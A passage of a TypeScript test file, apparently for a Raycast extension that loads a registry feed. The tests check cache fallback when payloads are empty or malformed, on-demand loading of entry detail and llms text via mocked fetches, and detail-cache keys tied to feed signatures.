    assert.equal(staleRecent.refreshStatus, "stale");
    assert.match(staleRecent.refreshWarning || "", /503/);
    assert.equal(staleRecent.entries[0].slug, "context7");
  });

  it("keeps a useful discovery snapshot when a payload normalizes to zero entries", async () => {
    const cache = new MemoryCache();
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    const goodTrending = {
      schemaVersion: 1,
      kind: "registry-trending",
      category: "all",
      platform: "all",
      entries: [
        {
          category: "mcp",
          slug: "context7",
          title: "Context7",
          description: "Fetch docs.",
          score: 9,
          reasons: ["upvotes"],
        },
      ],
    };
    await fetchFreshTrending({
      cache,
      feedUrl: devFeed,
      fetchFn: async () => response(goodTrending),
    });
    const cachedSnapshot = cache.get(trendingCacheKey(devFeed));
    assert.equal(loadCachedTrending(cache, devFeed).entries.length, 1);

    // Empty entries array: must not overwrite the cache and must fall back to stale.
    const emptyArray = await fetchFreshTrending({
      cache,
      feedUrl: devFeed,
      fetchFn: async () => response({ entries: [] }),
    });
    assert.equal(emptyArray.refreshStatus, "stale");
    assert.equal(emptyArray.entries[0].slug, "context7");
    assert.equal(cache.get(trendingCacheKey(devFeed)), cachedSnapshot);

    // Entries present but all rows fail normalization: same protection.
    const allMalformed = await fetchFreshTrending({
      cache,
      feedUrl: devFeed,
      fetchFn: async () =>
        response({ entries: [{ title: "no category or slug" }] }),
    });
    assert.equal(allMalformed.refreshStatus, "stale");
    assert.equal(allMalformed.entries[0].slug, "context7");
    assert.equal(cache.get(trendingCacheKey(devFeed)), cachedSnapshot);

    // With no prior cache to protect, a zero-entry payload must reject outright.
    await assert.rejects(
      fetchFreshRecentUpdates({
        cache,
        feedUrl: devFeed,
        fetchFn: async () => response({ entries: [] }),
      }),
      /malformed/,
    );
    assert.equal(cache.get(recentUpdatesCacheKey(devFeed)), undefined);
  });

  it("loads detail payloads on demand and falls back only when no detail URL exists", async () => {
    const cache = new MemoryCache();
    const requestedUrls: string[] = [];
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    const detail = await loadEntryDetail({
      entry: sampleEntry,
      cache,
      feedUrl: devFeed,
      fetchFn: async (input) => {
        requestedUrls.push(String(input));
        if (String(input).endsWith("/api/registry/entries/mcp/context7/llms")) {
          return response("remote full text", {
            headers: { "content-type": "text/plain" },
          });
        }
        return response({
          detailMarkdown: "# Remote",
          llmsUrl: "/api/registry/entries/mcp/context7/llms",
        });
      },
    });
    assert.deepEqual(detail, {
      copyText: "remote full text",
      detailMarkdown: "# Remote",
      llmsUrl: "/api/registry/entries/mcp/context7/llms",
    });
    assert.equal(
      requestedUrls[0],
      "https://preview.example.com/data/raycast/mcp/context7.json",
    );
    assert.equal(
      requestedUrls[1],
      "https://preview.example.com/api/registry/entries/mcp/context7/llms",
    );
    assert.match(
      cache.get(detailCacheKey(sampleEntry, devFeed)) || "",
      /remote full text/,
    );
    assert.equal(
      cache.get(`${DETAIL_CACHE_PREFIX}:${entryKey(sampleEntry)}`),
      undefined,
    );

    await assert.rejects(
      loadEntryDetail({
        entry: { ...sampleEntry, slug: "broken" },
        cache: new MemoryCache(),
        fetchFn: async () => response({ copyText: "missing markdown" }),
      }),
      /Detail payload was malformed/,
    );

    assert.deepEqual(
      await loadEntryDetail({
        entry: { ...sampleEntry, detailUrl: "" },
        cache: new MemoryCache(),
      }),
      fallbackDetail(sampleEntry),
    );
  });

  it("uses feed snapshot metadata when reading and writing detail cache entries", async () => {
    const cache = new MemoryCache();
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    cache.set(
      feedMetadataCacheKey(devFeed),
      JSON.stringify({
        generatedAt: "2026-04-29T00:00:00.000Z",
        signature: "current-signature",
        detailCacheNamespace: "current-signature",
      }),
    );
    cache.set(
      detailCacheKey(sampleEntry, devFeed, "old-signature"),
      JSON.stringify({
        copyText: "stale detail",
        detailMarkdown: "# Stale",
      }),
    );

    const detail = await loadEntryDetail({
      entry: sampleEntry,
      cache,
      feedUrl: devFeed,
      fetchFn: async (input) => {
        if (String(input).endsWith("/api/registry/entries/mcp/context7/llms")) {
          return response("current detail", {
            headers: { "content-type": "text/plain" },
          });
        }
        return response({
          detailMarkdown: "# Current",
          llmsUrl: "/api/registry/entries/mcp/context7/llms",
        });
      },
    });

    assert.equal(detail.copyText, "current detail");
    assert.match(
      cache.get(detailCacheKey(sampleEntry, devFeed, "current-signature")) ||
        "",
      /current detail/,
    );
  });
});
